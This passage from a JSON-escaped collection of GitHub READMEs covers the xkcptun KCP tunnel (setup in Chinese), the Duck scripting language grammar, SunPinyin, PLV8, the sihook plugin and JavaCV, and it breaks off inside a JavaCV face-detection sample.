https:\/\/img.shields.io\/badge\/Issues-welcome-brightgreen.svg?style=plastic\n[10]: https:\/\/github.com\/liudf0716\/xkcptung\/issues\/new\n[11]: https:\/\/img.shields.io\/badge\/Platform-%20OpenWRT%20%7CLEDE%20%7CCentOS%20-brightgreen.svg?style=plastic\n[12]: https:\/\/github.com\/gigibox\/openwrt-xkcptun\n[13]: https:\/\/img.shields.io\/badge\/KunTeng-Inside-blue.svg?style=plastic\n[14]: http:\/\/rom.kunteng.org\n\n# xkcptun \u57fa\u4e8ekcp\u548clibevent2\u5e93\uff0c\u7528c\u8bed\u8a00\u5b9e\u73b0\u7684kcptun\n\nxkcptun\u4e3b\u8981\u5e94\u7528\u4e8eLEDE\uff0copenwrt\u4e2d\uff0c\u5176\u539f\u7406\u5982\u56fe\uff1a\n\n<img src=\"kcptun.png\" alt=\"kcptun\" height=\"300px\"\/>\n\n### Compile\n\nxkcptun\u4f9d\u8d56[libevent2](https:\/\/github.com\/libevent\/libevent)\n\n\u5b89\u88c5libevent2\u5e93\u540e (apt-get install libevent-dev)\n\ngit clone https:\/\/github.com\/liudf0716\/xkcptun.git\n\ncd xkcptun\n\nmkdir build && cd build\n\ncmake .. (camke -DBUILD_STATIC_LINK=yes .. \/\/\u9759\u6001\u94fe\u63a5)\n\nmake\n\n\n\u751f\u6210xkcp_client, xkcp_server, xkcp_spy\n\n#### \u53c2\u8003\u6587\u6863\n\n1, [\u5b89\u88c5libjson c\u7684\u95ee\u9898](https:\/\/github.com\/liudf0716\/xkcptun\/wiki\/%E5%AE%89%E8%A3%85libjson-c%E7%9A%84%E9%97%AE%E9%A2%98)\n\n2, [bbr vs kcp  \u4f18\u5316http\u4e0b\u8f7d\u6027\u80fd\u5bf9\u6bd4\u62a5\u544a](https:\/\/github.com\/liudf0716\/xkcptun\/wiki\/bbr-vs-kcp-%E4%BC%98%E5%8C%96http%E4%B8%8B%E8%BD%BD%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94%E6%8A%A5%E5%91%8A)\n\n3, [\u5982\u4f55\u5728centos\u4e0a\u90e8\u7f72xkcptun server](https:\/\/github.com\/liudf0716\/xkcptun\/pull\/11)\n\n### OpenWrt\n\u7f16\u8bd1\u53ca\u5b89\u88c5\u8bf7\u53c2\u8003 [openwrt-xkcptun](https:\/\/github.com\/gigibox\/openwrt-xkcptun)\n\n### QuickStart\n\n\u4e3a\u65b9\u4fbf\u7406\u89e3\u548c\u4f7f\u7528\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u573a\u666f\u653e\u5728\u540c\u4e00\u53f0pc\u4e0a\uff0cpc\u4f7f\u7528ubuntu\u7cfb\u7edf\uff0c\u6211\u4eec\u901a\u8fc7xkcptun\u6765\u8bbf\u95ee\u672c\u673a\u7684http server\n\n\u5047\u8bbepc\u7684 eth0 ip \u4e3a 192.168.199.18\uff0c http server\u7684\u76d1\u542c\u7aef\u53e3\u4e3a80\u7aef\u53e3\uff0cxkcptun\u7684server\u548cclient\u914d\u7f6e\u5206\u522b\u5982\u4e0b\uff1a\n\nserver.json \u5982\u4e0b\uff1a\n```\n{\n  \"localinterface\": \"eth0\",\n  \"localport\": 9089,\n  \"remoteaddr\": \"192.168.199.18\",\n  \"remoteport\": 80,\n  \"key\": \"14789632a\",\n  \"crypt\": \"none\",\n  \"mode\": \"fast3\",\n  \"mtu\": 1350,\n  \"sndwnd\": 1024,\n  \"rcvwnd\": 1024,\n  \"datashard\": 10,\n  \"parityshard\": 3,\n  \"dscp\": 0,\n  \"nocomp\": true,\n  \"acknodelay\": false,\n  \"nodelay\": 0,\n  \"interval\": 20,\n  \"resend\": 2,\n  \"nc\": 1,\n  \"sockbuf\": 4194304,\n  \"keepalive\": 10\n}\n```\n\nclient.json\u5982\u4e0b\uff1a\n```\n{\n  \"localinterface\": \"eth0\",\n  \"localport\": 9088,\n  \"remoteaddr\": \"192.168.199.18\",\n  \"remoteport\": 9089,\n  \"key\": \"14789632a\",\n  \"crypt\": \"none\",\n  \"mode\": \"fast3\",\n  \"mtu\": 1350,\n  \"sndwnd\": 1024,\n  \"rcvwnd\": 1024,\n  \"datashard\": 10,\n  \"parityshard\": 3,\n  \"dscp\": 0,\n  \"nocomp\": true,\n  \"acknodelay\": false,\n  \"nodelay\": 0,\n  \"interval\": 20,\n  \"resend\": 2,\n  \"nc\": 1,\n  \"sockbuf\": 4194304,\n  \"keepalive\": 10\n}\n```\n\n\u5206\u522b\u8fd0\u884c\uff1a\n\nxkcp_server -c server.json -f -d 7\n\nxkcp_client -c client.json -f -d 7\n\n\n[\u6ce8] \u4ee5\u4e0a\u547d\u4ee4\u90fd\u662f\u8fd0\u884c\u5728debug\u548c\u524d\u53f0\u8fd0\u884c\u6a21\u5f0f\uff0c\u6b63\u5f0f\u90e8\u7f72\u7684\u65f6\u5019\u8981\u628a -f \u53bb\u6389\uff0c -d 0 \u5982\uff1a xkcp_server -c server.json -d 0\n\ncurl http:\/\/192.168.199.18:9088\n\n\u5176\u6267\u884c\u6548\u679c\u4e0ecurl http:\/\/192.168.199.18 \u7b49\u540c\n\n\nxkcp_spy -h 192.168.199.18 -s -t status\n\n\u67e5\u770b\u670d\u52a1\u5668\u7aef\u7684\u60c5\u51b5\n\nxkcp_spy -h 192.168.199.18 -c -t status\n\n\u67e5\u770b\u5ba2\u6237\u7aef\u7684\u60c5\u51b5\n\n### Todo\n\nCompatible with [kcptun](https:\/\/github.com\/xtaci\/kcptun)  <img src=\"https:\/\/github.com\/xtaci\/kcptun\/blob\/master\/logo-small.png\" alt=\"kcptun\" height=\"24px\" \/> \n\n\n\n### How to contribute our project(\u7ed9\u672c\u9879\u76ee\u505a\u8d21\u732e)\n\n\n\u6b22\u8fce\u5927\u5bb6\u7ed9\u672c\u9879\u76ee\u63d0\u4f9b\u610f\u89c1\u548c\u8d21\u732e\uff0c\u63d0\u4f9b\u610f\u89c1\u7684\u65b9\u6cd5\u53ef\u4ee5\u5728\u672c\u9879\u76ee\u7684[Issues](https:\/\/github.com\/liudf0716\/xkcptun\/issues\/new)\u63d0\uff0c\u66f4\u52a0\u6b22\u8fce\u7ed9\u9879\u76ee\u63d0PULL REQUEST\uff0c\u5177\u4f53\u63d0\u4ea4PR\u7684\u65b9\u6cd5\u8bf7\u53c2\u8003[CONTRIBUTING](https:\/\/github.com\/liudf0716\/xkcptun\/blob\/master\/CONTRIBUTING.md)\n\n\n### Contact me \n\nQQ\u7fa4 \uff1a [331230369](https:\/\/jq.qq.com\/?_wv=1027&k=47QGEhL)\n\n"},{"repo":"\/yangxi0126\/javaScript","language":"JavaScript","readme_contents":"# javaScript\n\u524d\u7aef\u7279\u6548\u5b58\u6863\n"},{"repo":"\/gregtour\/duck-lang","language":"C","readme_contents":"# Duck Programming Language      ![Build Status](https:\/\/travis-ci.org\/gregtour\/duck-lang.svg?branch=master)\nA simple scripting language based on the idea of duck-typing (or dynamic typing). \n\n>&ldquo;When I see a bird that walks like a duck and swims like a duck and quacks like a duck, I call that bird a duck.&rdquo;\n> &mdash; James Whitcomb Riley\n\n## Language Features\n\nThe duck programming language supports first-class functions, integer and floating-point arithmetic, string manipulation, dynamically-sized arrays, dictionary types, and basic object oriented programming. The syntax is strongly reminiscent of BASIC, Lua, or Python. While indentation is not strictly specified, the language requires specific whitespace in required newlines at the end of certain statements. Duck is currently only implemented in the form of a slow, interpreted frontend, making it useful as a portable scripting language. This frontend has been developed entirely in C.\n\nThe syntax of loops is somewhat different than in BASIC or other languages. For example, a while loop has the following syntax:\n```\nwhile (condition) do\n\t\/\/ loop body\n\t\/\/ ...\nloop\n```\nwhile a for loop in Duck looks like this\n```\nfor i = 1 to 10 do\n    \/\/ iterated instructions\n    \/\/ ...\n    \/\/ ...\nloop\n```\nNotice the use of the syntax \\`do' and \\`loop.' &nbsp;There are a number of other example programs in the _examples_ directory of the source repository.\n\nThe programming language's grammar is represented below in Backas-Naur form. The duck language has its own parser-generator, generating SLR(1) parse tables, so it is relatively easy to change the syntax of the language. Other optional ways to configure the language include disabling case-sensitivity or changing the format of comments, which are currently implemented as `\/* C-style block comments *\/`, `\/\/ full line comments`, `; semicolon until end of line comments`, and `# any macro use`.\n\nIt is easy to port libraries to Duck. Function hooks are implemented as pointers, of the form `int (function_pointer)(int)` where the argument count is passed as the only parameter. Arguments are bound as string identifiers, and are accessed dynamically in the bound-function's body.\n\nExample:\n```c\nvoid BindStandardLibrary()\n{\n    VALUE duckStdLib = LinkNamespace(\"duck\");\n\n    VALUE print = CreateFunction(DuckPrint);\n    AddParameter(print, \"output\");\n    \n    LinkFunction(duckStdLib, \"print\", print);\n    LinkFunction(duckStdLib, \"println\", print);\n\n    VALUE prompt = CreateFunction(DuckPrompt);\n    LinkFunction(duckStdLib, \"prompt\", prompt);\n}\n```\n\nAs an example of what a typical program might look like written in Duck, the following is an example of computing prime numbers.\n\n```\nfunction display_primes(limit)\n\tcount = 0\n\tnumbers = []\n\tfor i = 2 to limit do\n\t\tnumbers[i] = 1\n\tloop\n\tfor i = 2 to limit do\n\t\tif numbers[i] == 1 then\n\t\t\tcount = count + 1\n\t\t\tfor j = 2 to limit\/i do\n\t\t\t\tnumbers[i*j] = 0\n\t\t\tloop\n\t\t\tduck.print(i)\n\t\tend\n\tloop\nend\n```\n\n## Context free grammar\n```\n<program> ::= <stmt list>\n<stmt list> ::= <stmt list> <stmt>\n<stmt list> ::= <epsilon>\n<stmt> ::= import <identifier>\n<stmt> ::= call <reference>\n<stmt> ::= <endl>\n<stmt> ::= <expr> <endl>\n<stmt> ::= <assignment> <endl>\n<stmt> ::= <function def> <endl>\n<stmt> ::= <if> <endl>\n<stmt> ::= <if else> <endl>\n<stmt> ::= <for loop> <endl>\n<stmt> ::= <while loop> <endl>\n<stmt> ::= return <expr> <endl>\n<stmt> ::= break <endl>\n<stmt> ::= continue <endl>\n<function def> ::= function <identifier> <parameters> <endl> <stmt list> end\n<parameters> ::= <epsilon>\n<parameters> ::= ( )\n<parameters> ::= (<param decl>)\n<param decl> ::= <identifier>\n<param decl> ::= <param decl>, <identifier>\n<if> ::= if <condition> then <endl> <stmt list> end\n<if else> ::= if <condition> then <endl> <stmt list> else <endl> <stmt list> end\n<for loop> ::= for <identifier> = <arithmetic> to <arithmetic> do <endl> <stmt list> loop\n<while loop> ::= while <condition> do <endl> <stmt list> loop\n<assignment> ::= <l-value> = <assignment>\n<assignment> ::= <l-value> = <condition>\n<l-value> ::= <identifier>\n<l-value> ::= ( <l-value> )\n<l-value> ::= <reference> . <identifier>\n<l-value> ::= <reference> [ <expr> ]\n<expr> ::= <condition>\n<condition> ::= <condition> and <logic>\n<condition> ::= <condition> or <logic>\n<condition> ::= <condition> nor <logic>\n<condition> ::= <condition> xor <logic>\n<condition> ::= <logic>\n<logic> ::= not <comparison>\n<logic> ::= <comparison>\n<comparison> ::= <comparison> == <arithmetic>\n<comparison> ::= <comparison> != <arithmetic>\n<comparison> ::= <comparison> \\< <arithmetic>\n<comparison> ::= <comparison> > <arithmetic>\n<comparison> ::= <comparison> \\<= <arithmetic>\n<comparison> ::= <comparison> >= <arithmetic>\n<comparison> ::= <arithmetic>\n<arithmetic> ::= <arithmetic> + <term>\n<arithmetic> ::= <arithmetic> - <term>\n<arithmetic> ::= <arithmetic> & <term>\n<arithmetic> ::= <arithmetic> | <term>\n<arithmetic> ::= <term>\n<term> ::= <term> * <factor>\n<term> ::= <term> \/ <factor>\n<term> ::= <factor>\n<factor> ::= -<factor>\n<factor> ::= !<factor>\n<factor> ::= <final>\n<final> ::= ( <expr> )\n<final> ::= <boolean>\n<final> ::= <integer>\n<final> ::= <float>\n<final> ::= <string>\n<final> ::= <object>\n<final> ::= <reference>\n<reference> ::= <l-value>\n<reference> ::= <reference> ( )\n<reference> ::= <reference> ( <arguments> )\n<arguments> ::= <arguments>, <expr>\n<arguments> ::= <expr>\n<object> ::= [ ]\n<object> ::= [ <array init> ]\n<object> ::= [ <dictionary init> ]\n<array init> ::= <array init>, <expr>\n<array init> ::= <expr>\n<dictionary init> ::= <dictionary init>, <identifier> : <expr>\n<dictionary init> ::= <identifier> : <expr>\n<boolean> ::= true\n<boolean> ::= false\n\n```\n\n## Standard Library\nDuck has a standard library supporting both command-line input and output. See: stdduck.h.\nThere are also SDL and OpenGL bindings to support making a graphical window as well as draw calls.\n\nHere is a list of those functions:\n\n#### Library\n##### Duck\n* duck.print(output)\n* duck.println(output)\n* duck.prompt()\n\n##### SDL\n* SDL.MakeWindow(width, height, title, fullscreen)\n* SDL.flip()\n* SDL.event()\n* SDL.clearScreen()\n* SDL.running()\n* SDL.waitkey()\n* SDL.quit()\n\n##### GL\n* SDL.glLoadIdentity()\n* SDL.glTranslatef(x, y, z)\n* SDL.glRotatef(deg, x, y, z)\n* SDL.glScalef(x, y, z)\n* SDL.glBegin(primitive)\n* SDL.glColor3f(r, g, b)\n* SDL.glVertex3f(x, y, z)\n* SDL.glNormal3f(x, y, z)\n* SDL.glEnd()\n\n## Building\nDuck uses CMake 2.8. To build simply run:\n```\n> cmake .\n> make\n```\n\nBuilding gduck with SDL support requires SDL and OpenGL libraries. There are no platform specific libraries.\n\n## Credits\nGreg Tourville\n\nHiroyuki Sano\n\nRobert Cope\n\n\n## Future Work\n\n* Implementing a binary compiler\n* Memory management and garbage collection, to prevent crashes due to running out of memory\n* Optional, strongly\/statically typed form of DUCK\n* Multithreaded parallelism &mdash; implicit or explicit through syntax analysis or library functions\n* Benchmark and profiling performance intrinsics\n* Expanding the standard library\n\n"},{"repo":"\/sunpinyin\/sunpinyin","language":"C++","readme_contents":"SunPinyin\n===\n\nSunPinyin is an SLM (Statistical Language Model) based input method\nengine. To model the Chinese language, it uses a backoff bigram and\ntrigram language model.\n\nCurrently, SunPinyin 2.0 is available on IBus, SCIM, and as a\nstandalone XIM Server.\n\n[![Build Status](https:\/\/travis-ci.org\/sunpinyin\/sunpinyin.svg?branch=master)](https:\/\/travis-ci.org\/sunpinyin\/sunpinyin)\n"},{"repo":"\/plv8\/plv8","language":"C++","readme_contents":"PLV8 - A Procedural Language in Javascript powered by V8\n=================================================\n\nPLV8 is a shared library that provides a PostgreSQL procedural language powered\nby V8 Javascript Engine.  With this program you can write in Javascript your\nfunction that is callable from SQL.\n\n## Installing\n\n    =# CREATE EXTENSION plv8;\n\nThis will install PLV8 into your database if it exists as an extension.\n\n## Testing\n\nTo test, you can execute:\n\n    =# DO $$ plv8.elog(NOTICE, \"hello there!\"); $$ LANGUAGE plv8;\n\nFor full documentation, see [https:\/\/plv8.github.io\/](https:\/\/plv8.github.io\/).\n"},{"repo":"\/redxu\/sihook","language":"C","readme_contents":"\t\t\tSIHOOK\r\n=================================\r\nABOUT:\r\nsihook is a tabs plugin for source insight 3.x.\r\n\r\n\r\nBUILD:\r\nsihook is build with w32-gcc,sihook.cbp is a codeblocks project file.\r\nyou can also make it use Makefile,there's a simple one in the project.\r\n\r\n\r\nINSTALL:\r\ncopy msimg32.dll sihook.dll to source insight dir. \r\n"},{"repo":"\/bytedeco\/javacv","language":"Java","readme_contents":"JavaCV\r\n======\r\n\r\n[![Gitter](https:\/\/badges.gitter.im\/bytedeco\/javacv.svg)](https:\/\/gitter.im\/bytedeco\/javacv) [![Maven Central](https:\/\/maven-badges.herokuapp.com\/maven-central\/org.bytedeco\/javacv-platform\/badge.svg)](https:\/\/maven-badges.herokuapp.com\/maven-central\/org.bytedeco\/javacv-platform) [![Sonatype Nexus (Snapshots)](https:\/\/img.shields.io\/nexus\/s\/https\/oss.sonatype.org\/org.bytedeco\/javacv.svg)](http:\/\/bytedeco.org\/builds\/) [![Build Status](https:\/\/travis-ci.org\/bytedeco\/javacv.svg?branch=master)](https:\/\/travis-ci.org\/bytedeco\/javacv)\r\n\r\n\r\nIntroduction\r\n------------\r\nJavaCV uses wrappers from the [JavaCPP Presets](https:\/\/github.com\/bytedeco\/javacpp-presets) of commonly used libraries by researchers in the field of computer vision ([OpenCV](http:\/\/opencv.org\/), [FFmpeg](http:\/\/ffmpeg.org\/), [libdc1394](http:\/\/damien.douxchamps.net\/ieee1394\/libdc1394\/), [PGR FlyCapture](https:\/\/www.ptgrey.com\/flycapture-sdk), [OpenKinect](http:\/\/openkinect.org\/), [librealsense](https:\/\/github.com\/IntelRealSense\/librealsense), [CL PS3 Eye Driver](https:\/\/codelaboratories.com\/downloads\/), [videoInput](http:\/\/muonics.net\/school\/spring05\/videoInput\/), [ARToolKitPlus](https:\/\/launchpad.net\/artoolkitplus), [flandmark](http:\/\/cmp.felk.cvut.cz\/~uricamic\/flandmark\/), [Leptonica](http:\/\/www.leptonica.org\/), and [Tesseract](https:\/\/github.com\/tesseract-ocr\/tesseract)) and provides utility classes to make their functionality easier to use on the Java platform, including Android.\r\n\r\nJavaCV also comes with hardware accelerated full-screen image display (`CanvasFrame` and `GLCanvasFrame`), easy-to-use methods to execute code in parallel on multiple cores (`Parallel`), user-friendly geometric and color calibration of cameras and projectors (`GeometricCalibrator`, `ProCamGeometricCalibrator`, `ProCamColorCalibrator`), detection and matching of feature points (`ObjectFinder`), a set of classes that implement direct image alignment of projector-camera systems (mainly `GNImageAligner`, `ProjectiveTransformer`, `ProjectiveColorTransformer`, `ProCamTransformer`, and `ReflectanceInitializer`), a blob analysis package (`Blobs`), as well as miscellaneous functionality in the `JavaCV` class. Some of these classes also have an OpenCL and OpenGL counterpart, their names ending with `CL` or starting with `GL`, i.e.: `JavaCVCL`, `GLCanvasFrame`, etc.\r\n\r\nTo learn how to use the API, since documentation currently lacks, please refer to the [Sample Usage](#sample-usage) section below as well as the [sample programs](https:\/\/github.com\/bytedeco\/javacv\/tree\/master\/samples\/), including two for Android (`FacePreview.java` and `RecordActivity.java`), also found in the `samples` directory. You may also find it useful to refer to the source code of [ProCamCalib](https:\/\/github.com\/bytedeco\/procamcalib) and [ProCamTracker](https:\/\/github.com\/bytedeco\/procamtracker) as well as [examples ported from OpenCV2 Cookbook](https:\/\/github.com\/bytedeco\/javacv-examples\/) and the associated [wiki pages](https:\/\/github.com\/bytedeco\/javacv-examples\/tree\/master\/OpenCV_Cookbook).\r\n\r\nPlease keep me informed of any updates or fixes you make to the code so that I may integrate them into the next release. Thank you! And feel free to ask questions on [the mailing list](http:\/\/groups.google.com\/group\/javacv) if you encounter any problems with the software! I am sure it is far from perfect...\r\n\r\n\r\nDownloads\r\n---------\r\nArchives containing JAR files are available as [releases](https:\/\/github.com\/bytedeco\/javacv\/releases). The binary archive contains builds for Android, iOS, Linux, Mac OS X, and Windows. The JAR files for specific child modules or platforms can also be obtained individually from the [Maven Central Repository](http:\/\/search.maven.org\/#search|ga|1|bytedeco).\r\n\r\nTo install manually the JAR files, follow the instructions in the [Manual Installation](#manual-installation) section below.\r\n\r\nWe can also have everything downloaded and installed automatically with:\r\n\r\n * Maven (inside the `pom.xml` file)\r\n```xml\r\n  <dependency>\r\n    <groupId>org.bytedeco<\/groupId>\r\n    <artifactId>javacv-platform<\/artifactId>\r\n    <version>1.5.2<\/version>\r\n  <\/dependency>\r\n```\r\n\r\n * Gradle (inside the `build.gradle` file)\r\n```groovy\r\n  dependencies {\r\n    compile group: 'org.bytedeco', name: 'javacv-platform', version: '1.5.2'\r\n  }\r\n```\r\n\r\n * Leiningen (inside the `project.clj` file)\r\n```clojure\r\n  :dependencies [\r\n    [org.bytedeco\/javacv-platform \"1.5.2\"]\r\n  ]\r\n```\r\n\r\n * sbt (inside the `build.sbt` file)\r\n```scala\r\n  libraryDependencies += \"org.bytedeco\" % \"javacv-platform\" % \"1.5.2\"\r\n```\r\n\r\nThis downloads binaries for all platforms, but to get binaries for only one platform we can set the `javacpp.platform` system property (via the `-D` command line option) to something like `android-arm`, `linux-x86_64`, `macosx-x86_64`, `windows-x86_64`, etc. Please refer to the [README.md file of the JavaCPP Presets](https:\/\/github.com\/bytedeco\/javacpp-presets#downloads) for details. Another option available for Scala users is [sbt-javacv](https:\/\/github.com\/bytedeco\/sbt-javacv).\r\n\r\n\r\nRequired Software\r\n-----------------\r\nTo use JavaCV, you will first need to download and install the following software:\r\n\r\n * An implementation of Java SE 7 or newer:\r\n   * OpenJDK  http:\/\/openjdk.java.net\/install\/  or\r\n   * Oracle JDK  http:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/  or\r\n   * IBM JDK  http:\/\/www.ibm.com\/developerworks\/java\/jdk\/\r\n\r\nFurther, although not always required, some functionality of JavaCV also relies on:\r\n\r\n * CL Eye Platform SDK (Windows only)  http:\/\/codelaboratories.com\/downloads\/\r\n * Android SDK API 21 or newer  http:\/\/developer.android.com\/sdk\/\r\n * JOCL and JOGL from JogAmp  http:\/\/jogamp.org\/\r\n\r\nFinally, please make sure everything has the same bitness: **32-bit and 64-bit modules do not mix under any circumstances**.\r\n\r\n\r\nManual Installation\r\n-------------------\r\nSimply put all the desired JAR files (`opencv*.jar`, `ffmpeg*.jar`, etc.), in addition to `javacpp.jar` and `javacv.jar`, somewhere in your class path. Here are some more specific instructions for common cases:\r\n\r\nNetBeans (Java SE 7 or newer):\r\n\r\n 1. In the Projects window, right-click the Libraries node of your project, and select \"Add JAR\/Folder...\".\r\n 2. Locate the JAR files, select them, and click OK.\r\n\r\nEclipse (Java SE 7 or newer):\r\n\r\n 1. Navigate to Project > Properties > Java Build Path > Libraries and click \"Add External JARs...\".\r\n 2. Locate the JAR files, select them, and click OK.\r\n\r\nIntelliJ IDEA (Android 5.0 or newer):\r\n\r\n 1. Follow the instructions on this page: http:\/\/developer.android.com\/training\/basics\/firstapp\/\r\n 2. Copy all the JAR files into the `app\/libs` subdirectory.\r\n 3. Navigate to File > Project Structure > app > Dependencies, click `+`, and select \"2 File dependency\".\r\n 4. Select all the JAR files from the `libs` subdirectory.\r\n\r\nAfter that, the wrapper classes for OpenCV and FFmpeg, for example, can automatically access all of their C\/C++ APIs:\r\n\r\n * [OpenCV documentation](http:\/\/docs.opencv.org\/master\/)\r\n * [FFmpeg documentation](http:\/\/ffmpeg.org\/doxygen\/trunk\/)\r\n\r\n\r\nSample Usage\r\n------------\r\nThe class definitions are basically ports to Java of the original header files in C\/C++, and I deliberately decided to keep as much of the original syntax as possible. For example, here is a method that tries to load an image file, smooth it, and save it back to disk:\r\n\r\n```java\r\nimport org.bytedeco.opencv.opencv_core.*;\r\nimport org.bytedeco.opencv.opencv_imgproc.*;\r\nimport static org.bytedeco.opencv.global.opencv_core.*;\r\nimport static org.bytedeco.opencv.global.opencv_imgproc.*;\r\nimport static org.bytedeco.opencv.global.opencv_imgcodecs.*;\r\n\r\npublic class Smoother {\r\n    public static void smooth(String filename) {\r\n        Mat image = imread(filename);\r\n        if (image != null) {\r\n            GaussianBlur(image, image, new Size(3, 3), 0);\r\n            imwrite(filename, image);\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nJavaCV also comes with helper classes and methods on top of OpenCV and FFmpeg to facilitate their integration to the Java platform. Here is a small demo program demonstrating the most frequently useful parts:\r\n\r\n```java\r\nimport java.io.File;\r\nimport java.net.URL;\r\nimport org.bytedeco.javacv.*;\r\nimport org.bytedeco.javacpp.*;\r\nimport org.bytedeco.javacpp.indexer.*;\r\nimport org.bytedeco.opencv.opencv_core.*;\r\nimport org.bytedeco.opencv.opencv_imgproc.*;\r\nimport org.bytedeco.opencv.opencv_calib3d.*;\r\nimport org.bytedeco.opencv.opencv_objdetect.*;\r\nimport static org.bytedeco.opencv.global.opencv_core.*;\r\nimport static org.bytedeco.opencv.global.opencv_imgproc.*;\r\nimport static org.bytedeco.opencv.global.opencv_calib3d.*;\r\nimport static org.bytedeco.opencv.global.opencv_objdetect.*;\r\n\r\npublic class Demo {\r\n    public static void main(String[] args) throws Exception {\r\n        String classifierName = null;\r\n        if (args.length > 0) {\r\n            classifierName = args[0];\r\n        } else {\r\n            URL url = new URL(\"https:\/\/raw.github.com\/opencv\/opencv\/master\/data\/haarcascades\/haarcascade_frontalface_alt.xml\");\r\n            File file = Loader.cacheResource(url);\r\n            classifierName = file.getAbsolutePath();\r\n        }\r\n\r\n        \/\/ We can \"cast\" Pointer objects by instantiating a new object of the desired class.\r\n        CascadeClassifier classifier = new CascadeClassifier(classifierName);\r\n        if (classifier == null) {\r\n            System.err.println(\"Error loading classifier file \\\"\" + classifierName + \"\\\".\");\r\n            System.exit(1);\r\n        }\r\n\r\n        \/\/ The available FrameGrabber classes include OpenCVFrameGrabber (opencv_videoio),\r\n        \/\/ DC1394FrameGrabber, FlyCapture2FrameGrabber, OpenKinectFrameGrabber, OpenKinect2FrameGrabber,\r\n        \/\/ RealSenseFrameGrabber, RealSense2FrameGrabber, PS3EyeFrameGrabber, VideoInputFrameGrabber, and FFmpegFrameGrabber.\r\n        FrameGrabber grabber = FrameGrabber.createDefault(0);\r\n        grabber.start();\r\n\r\n        \/\/ CanvasFrame, FrameGrabber, and FrameRecorder use Frame objects to communicate image data.\r\n        \/\/ We need a FrameConverter to interface with other APIs (Android, Java 2D, JavaFX, Tesseract, OpenCV, etc).\r\n        OpenCVFrameConverter.ToMat converter = new OpenCVFrameConverter.ToMat();\r\n\r\n        \/\/ FAQ about IplImage and Mat objects from OpenCV:\r\n        \/\/ - For custom raw processing of data, createBuffer() returns an NIO direct\r\n        \/\/   buffer wrapped around the memory pointed by imageData, and under Android we can\r\n        \/\/   also use that Buffer with Bitmap.copyPixelsFromBuffer() and copyPixelsToBuffer().\r\n        \/\/ - To get a BufferedImage from an IplImage, or vice versa, we can chain calls to\r\n        \/\/   Java2DFrameConverter and OpenCVFrameConverter, one after the other.\r\n        \/\/ - Java2DFrameConverter also has static copy() methods that we can use to transfer\r\n        \/\/   data more directly between BufferedImage and IplImage or Mat via Frame objects.\r\n        Mat grabbedImage = converter.convert(grabber.grab());\r\n        int height = grabbedImage.rows();\r\n        int width = grabbedImage.cols();\r\n\r\n        \/\/ Objects allocated with `new`, clone(), or a create*() factory method are automatically released\r\n        \/\/ by the garbage collector, but may still be explicitly released by calling deallocate().\r\n        \/\/ You shall NOT call cvReleaseImage(), cvReleaseMemStorage(), etc. on objects allocated this way.\r\n        Mat grayImage = new Mat(height, width, CV_8UC1);\r\n        Mat rotatedImage = grabbedImage.clone();\r\n\r\n        \/\/ The OpenCVFrameRecorder class simply uses the VideoWriter of opencv_videoio,\r\n        \/\/ but FFmpegFrameRecorder also exists as a more versatile alternative.\r\n        FrameRecorder recorder = FrameRecorder.createDefault(\"output.avi\", width, height);\r\n        recorder.start();\r\n\r\n        \/\/ CanvasFrame is a JFrame containing a Canvas component, which is hardware accelerated.\r\n        \/\/ It can also switch into full-screen mode when called with a screenNumber.\r\n        \/\/ We should also specify the relative monitor\/camera response for proper gamma correction.\r\n        CanvasFrame frame = new CanvasFrame(\"Some Title\", CanvasFrame.getDefaultGamma()\/grabber.getGamma());\r\n\r\n        \/\/ Let's create some random 3D rotation...\r\n        Mat randomR    = new Mat(3, 3, CV_64FC1),\r\n            randomAxis = new Mat(3, 1, CV_64FC1);\r\n        \/\/ We can easily and efficiently access the elements of matrices and images\r\n        \/\/ through an Indexer object with the set of get() and put() methods.\r\n        DoubleIndexer Ridx = randomR.createIndexer(),\r\n                   axisIdx = randomAxis.createIndexer();\r\n        axisIdx.put(0, (Math.random() - 0.5) \/ 4,\r\n                       (Math.random() - 0.5) \/ 4,\r\n                       (Math.random() - 0.5) \/ 4);\r\n        Rodrigues(randomAxis, randomR);\r\n        double f = (width + height) \/ 2.0;  Ridx.put(0, 2, Ridx.get(0, 2) * f);\r\n                                            Ridx.put(1, 2, Ridx.get(1, 2) * f);\r\n        Ridx.put(2, 0, Ridx.get(2, 0) \/ f); Ridx.put(2, 1, Ridx.get(2, 1) \/ f);\r\n        System.out.println(Ridx);\r\n\r\n        \/\/ We can allocate native arrays using constructors taking an integer as argument.\r\n        Point hatPoints = new Point(3);\r\n\r\n        while (frame.isVisible() && (grabbedImage = converter.convert(grabber.grab())) != null) {\r\n            \/\/ Let's try to detect some faces! but we need a grayscale image...\r\n            cvtColor(grabbedImage, grayImage, CV_BGR2GRAY);\r\n            RectVector faces = new RectVector();\r\n            classifier.detectMultiScale(grayImage, faces);\r\n            long total = faces.size();\r\n            for (long i = 0; i < total; i++) {\r\n                Rect r = faces.get(i);\r\n                int x = r.x(), y = r.y(), w = r.width(), h = r.height();\r\n                rectangle(grabbedImage, new Point(x, y), new Point(x + w, y + h), Scalar.RED, 1, CV_AA, 0);\r\n\r\n                \/\/ To access or pass as argument the elements of a native array, call position() before.\r\n                hatPoints.position(0).x(x - w \/ 10     ).y(y - h \/ 10);\r\n                hatPoints.position(1).x(x + w * 11 \/ 10).y(y - h \/ 10);\r\n                hatPoints.position(2).x(x + w \/ 2      ).y(y - h \/ 2 );\r\n                fillConvexPoly(grabbedImage, hatPoints.position(0), 3, Scalar.GREEN, CV_AA, 0);\r\n            }\r\n\r\n            \/\/ Let's find some contours! but first some thresholding...\r\n            threshold(grayImage, grayImage, 64, 255, CV_THRESH_BINARY);\r\n\r\n            \/\/ To check if an output argument is null we may call either isNull() or equals(null).\r\n            MatVector contours = new MatVector();\r\n            findContours(grayImage, contours, CV_RETR_LIST, CV_CHAIN_APPROX_SIMPLE);\r\n            long n = contours.size();\r\n            for (long i = 0; i < n; i++) {\r\n                Mat contour = contours.get(i);\r\n                Mat points = new Mat();\r\n                approxPolyDP(contour, points, arcLength(contour, true) * 0.02, true);\r\n                drawContours(grabbedImage, new MatVector(points), -1, Scalar.BLUE);\r\n            }\r\n\r\n            warpPerspective(grabbedImage, rotatedImage, randomR, rotatedImage.size());\r\n\r\n            Frame rotatedFrame = converter.convert(rotatedImage);\r\n            frame.showImage(rotatedFrame);\r\n            recorder.record(rotatedFrame);\r\n        }\r\n        